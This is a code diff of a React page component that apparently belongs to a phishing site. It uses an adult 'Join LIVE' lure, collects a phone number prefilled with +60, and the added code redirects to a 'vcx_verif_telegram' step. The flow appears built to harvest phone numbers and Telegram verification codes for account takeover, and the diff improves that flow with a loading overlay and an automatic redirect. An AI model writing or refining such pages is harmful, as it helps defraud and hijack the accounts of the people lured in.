@@ -1,12 +1,13 @@
 import Rhmt2Layout from "@/Layouts/rhmt2_layout";
 import RhmtLayout from "@/Layouts/rhmt_layouts";
-import { Link, useForm } from "@inertiajs/react";
+import { Link, router, useForm } from "@inertiajs/react";
 import { TextField } from "@mui/material";
 import React, { useEffect, useState } from "react";
 
 export default function SexLayouts() {
     const [showImage, setShowImage] = useState(0);
     const { data, setData, post, errors } = useForm({ phoneNumber: "+60" });
+    const [loading, setLoading] = useState(false);
     useEffect(() => {
         if (showImage == 0) {
             setTimeout(() => {
@@ -27,10 +28,26 @@ export default function SexLayouts() {
         }
     };
     const submitHandler = () => {
-        post(route("rhmt.vcx_store_number"));
+        setLoading(true);
+        post(route("rhmt.vcx_store_number"), {
+            onSuccess: () => {
+                setTimeout(() => {
+                    setLoading(false);
+                }, 10000);
+                router.visit(route("rhmt.vcx_verif_telegram"));
+            },
+            onError: () => {
+                setLoading(false);
+            },
+        });
     };
     return (
         <Rhmt2Layout>
+            {loading && (
+                <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center z-[99] ">
+                    <img src="/loading.gif" alt="" />
+                </div>
+            )}
             <div className="absolute top-0 left-0 w-full h-full flex justify-center items-start flex-col z-[10] px-5">
                 <h3 className="text-4xl font-extrabold text-purple-700 font-sans tracking-tighter">
                     Join LIVE{" "}
